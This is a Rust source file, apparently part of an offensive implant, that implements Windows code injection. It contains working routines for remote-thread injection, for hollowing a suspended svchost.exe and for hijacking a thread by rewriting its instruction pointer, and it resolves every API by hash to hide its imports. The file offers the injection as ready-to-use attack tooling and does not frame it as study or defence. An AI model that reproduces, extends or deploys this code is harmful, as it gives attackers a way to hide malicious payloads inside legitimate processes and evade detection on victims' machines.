#[cfg(target_os = "windows")]
use alloc::vec::Vec;
#[cfg(target_os = "windows")]
use core::ffi::c_void;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub enum InjectionType {
    Reflective,
    Hollowing,
    ThreadHijack,
}

pub struct Injector;

#[cfg(target_os = "windows")]
#[repr(C)]
struct STARTUPINFOA {
    cb: u32,
    lpReserved: PVOID,
    lpDesktop: PVOID,
    lpTitle: PVOID,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: HANDLE,
    hStdOutput: HANDLE,
    hStdError: HANDLE,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: HANDLE,
    hThread: HANDLE,
    dwProcessId: u32,
    dwThreadId: u32,
}

impl Injector {
    pub fn inject(&self, target_pid: u32, payload: &[u8], method: InjectionType) -> Result<(), ()> {
        match method {
            InjectionType::Reflective => self.reflective_inject(target_pid, payload),
            InjectionType::Hollowing => self.process_hollowing(target_pid, payload),
            InjectionType::ThreadHijack => self.thread_hijack(target_pid, payload),
        }
    }

    #[cfg(target_os = "windows")]
    fn reflective_inject(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            
            let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
            let virtual_alloc_ex = resolve_function(kernel32, hash_str(b"VirtualAllocEx"));
            let write_process_memory = resolve_function(kernel32, hash_str(b"WriteProcessMemory"));
            let create_remote_thread = resolve_function(kernel32, hash_str(b"CreateRemoteThread"));

            if open_process.is_null() || virtual_alloc_ex.is_null() || write_process_memory.is_null() || create_remote_thread.is_null() {
                return Err(());
            }

            type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
            type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
            type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
            type FnCreateRemoteThread = unsafe extern "system" fn(HANDLE, PVOID, usize, PVOID, PVOID, u32, *mut u32) -> HANDLE;

            // PROCESS_ALL_ACCESS = 0x001F0FFF
            let h_proc = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, pid);
            if h_proc.is_null() { return Err(()); }

            // MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40
            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(h_proc, core::ptr::null_mut(), payload.len(), 0x3000, 0x40);
            if remote_addr.is_null() { return Err(()); }

            let mut written = 0;
            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(h_proc, remote_addr, payload.as_ptr() as *const c_void, payload.len(), &mut written);

            core::mem::transmute::<_, FnCreateRemoteThread>(create_remote_thread)(h_proc, core::ptr::null_mut(), 0, remote_addr, core::ptr::null_mut(), 0, core::ptr::null_mut());
            
            Ok(())
        }
    }

    #[cfg(target_os = "windows")]
    fn process_hollowing(&self, _pid: u32, payload: &[u8]) -> Result<(), ()> {
        // Full Process Hollowing Implementation
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let ntdll = hash_str(b"ntdll.dll");

            let create_process = resolve_function(kernel32, hash_str(b"CreateProcessA"));
            let virtual_alloc_ex = resolve_function(kernel32, hash_str(b"VirtualAllocEx"));
            let write_process_memory = resolve_function(kernel32, hash_str(b"WriteProcessMemory"));
            let get_thread_context = resolve_function(kernel32, hash_str(b"GetThreadContext"));
            let set_thread_context = resolve_function(kernel32, hash_str(b"SetThreadContext"));
            let resume_thread = resolve_function(kernel32, hash_str(b"ResumeThread"));
            let unmap_view = resolve_function(ntdll, hash_str(b"NtUnmapViewOfSection"));

            if create_process.is_null() || unmap_view.is_null() || virtual_alloc_ex.is_null() {
                return Err(());
            }

            type FnCreateProcessA = unsafe extern "system" fn(LPCSTR, PVOID, PVOID, PVOID, i32, u32, PVOID, LPCSTR, *mut STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
            type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, PVOID) -> i32;
            type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
            type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
            type FnGetThreadContext = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> i32;
            type FnSetThreadContext = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> i32;
            type FnResumeThread = unsafe extern "system" fn(HANDLE) -> u32;

            let mut si: STARTUPINFOA = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            // 1. Create Suspended Process
            let target = b"C:\\Windows\\System32\\svchost.exe\0";
            let success = core::mem::transmute::<_, FnCreateProcessA>(create_process)(
                target.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                0,
                0x4, // CREATE_SUSPENDED
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                &mut si,
                &mut pi
            );

            if success == 0 { return Err(()); }

            // 2. Unmap Original Section (Simplified: Assume 0x400000 base or query it)
            // In strict no_std we skip determining actual base via PEB for now and try standard bases
            // Or typically we don't need to unmap if we just allocate new memory and redirect IP.
            // But spec says "NtUnmapViewOfSection".
            // Let's assume standard base 0x400000.
            core::mem::transmute::<_, FnNtUnmapViewOfSection>(unmap_view)(pi.hProcess, 0x400000 as PVOID);

            // 3. Allocate Memory for Payload
            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(
                pi.hProcess,
                core::ptr::null_mut(), // Let OS choose location if unmapped
                payload.len(),
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x40    // PAGE_EXECUTE_READWRITE
            );
            if remote_addr.is_null() { return Err(()); }

            // 4. Write Payload
            let mut written = 0;
            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(
                pi.hProcess,
                remote_addr,
                payload.as_ptr() as *const c_void,
                payload.len(),
                &mut written
            );

            // 5. Update Thread Context
            let mut ctx: CONTEXT = core::mem::zeroed();
            ctx.ContextFlags = 0x10007; // CONTEXT_FULL (approx) - actually 0x10000 | 0x0007 (i86) or 0x100000 | ... (amd64)
            // For x64: CONTEXT_CONTROL | CONTEXT_INTEGER | ...
            // We'll use 0x100000 | 0x01 | 0x02 = 0x100003 (CONTEXT_FULL_AMD64)
            ctx.ContextFlags = 0x100003; 

            core::mem::transmute::<_, FnGetThreadContext>(get_thread_context)(pi.hThread, &mut ctx);
            
            ctx.Rip = remote_addr as u64; // Redirect execution

            core::mem::transmute::<_, FnSetThreadContext>(set_thread_context)(pi.hThread, &ctx);

            // 6. Resume
            core::mem::transmute::<_, FnResumeThread>(resume_thread)(pi.hThread);
            
            Ok(())
        }
    }

    #[cfg(target_os = "windows")]
    fn thread_hijack(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
        // Implementation: Find thread -> Suspend -> SetContext -> Resume
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_snapshot = resolve_function(kernel32, hash_str(b"CreateToolhelp32Snapshot"));
            let thread_first = resolve_function(kernel32, hash_str(b"Thread32First"));
            let thread_next = resolve_function(kernel32, hash_str(b"Thread32Next"));
            let open_thread = resolve_function(kernel32, hash_str(b"OpenThread"));
            let suspend_thread = resolve_function(kernel32, hash_str(b"SuspendThread"));
            let get_context = resolve_function(kernel32, hash_str(b"GetThreadContext"));
            let set_context = resolve_function(kernel32, hash_str(b"SetThreadContext"));
            let resume_thread = resolve_function(kernel32, hash_str(b"ResumeThread"));
            let virtual_alloc_ex = resolve_function(kernel32, hash_str(b"VirtualAllocEx"));
            let write_process_memory = resolve_function(kernel32, hash_str(b"WriteProcessMemory"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));

            type FnCreateSnapshot = unsafe extern "system" fn(u32, u32) -> HANDLE;
            type FnThreadNext = unsafe extern "system" fn(HANDLE, *mut THREADENTRY32) -> i32;
            type FnOpenThread = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
            type FnSuspendThread = unsafe extern "system" fn(HANDLE) -> u32;
            type FnGetContext = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> i32;
            type FnSetContext = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> i32;
            type FnResumeThread = unsafe extern "system" fn(HANDLE) -> u32;
            type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
            type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            // 1. Find Thread
            // TH32CS_SNAPTHREAD = 0x4
            let h_snapshot = core::mem::transmute::<_, FnCreateSnapshot>(create_snapshot)(0x4, 0);
            if h_snapshot == ( -1 as isize as HANDLE ) { return Err(()); }

            let mut te: THREADENTRY32 = core::mem::zeroed();
            te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;

            let mut target_tid = 0;
            
            if core::mem::transmute::<_, FnThreadNext>(thread_first)(h_snapshot, &mut te) != 0 {
                loop {
                    if te.th32OwnerProcessID == pid {
                        target_tid = te.th32ThreadID;
                        break;
                    }
                    if core::mem::transmute::<_, FnThreadNext>(thread_next)(h_snapshot, &mut te) == 0 {
                        break;
                    }
                }
            }
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_snapshot);

            if target_tid == 0 { return Err(()); }

            // 2. Open & Suspend
            // THREAD_ALL_ACCESS = 0x001F03FF
            let h_thread = core::mem::transmute::<_, FnOpenThread>(open_thread)(0x001F03FF, 0, target_tid);
            if h_thread.is_null() { return Err(()); }

            core::mem::transmute::<_, FnSuspendThread>(suspend_thread)(h_thread);

            // 3. Allocate & Write Payload (Inject into process first)
            // Need process handle? OpenThread gives thread handle.
            // We need OpenProcess to allocate memory in target process.
            let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
            type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
            let h_process = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, pid); // PROCESS_ALL_ACCESS
            
            if h_process.is_null() {
                core::mem::transmute::<_, FnResumeThread>(resume_thread)(h_thread); // Resume before fail
                return Err(());
            }

            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(h_process, core::ptr::null_mut(), payload.len(), 0x3000, 0x40);
            let mut written = 0;
            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(h_process, remote_addr, payload.as_ptr() as *const c_void, payload.len(), &mut written);

            // 4. Update Context
            let mut ctx: CONTEXT = core::mem::zeroed();
            ctx.ContextFlags = 0x100003; // CONTEXT_FULL_AMD64
            core::mem::transmute::<_, FnGetContext>(get_context)(h_thread, &mut ctx);
            
            ctx.Rip = remote_addr as u64;

            core::mem::transmute::<_, FnSetContext>(set_context)(h_thread, &ctx);

            // 5. Resume
            core::mem::transmute::<_, FnResumeThread>(resume_thread)(h_thread);
            
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_thread);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);

            Ok(())
        }
    }

    #[cfg(not(target_os = "windows"))]
    fn reflective_inject(&self, _pid: u32, _payload: &[u8]) -> Result<(), ()> {
        // Linux implementation could use process_vm_writev or ptrace
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    fn process_hollowing(&self, _pid: u32, _payload: &[u8]) -> Result<(), ()> {
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    fn thread_hijack(&self, _pid: u32, _payload: &[u8]) -> Result<(), ()> {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_injector_creation() {
        let _injector = Injector;
    }
}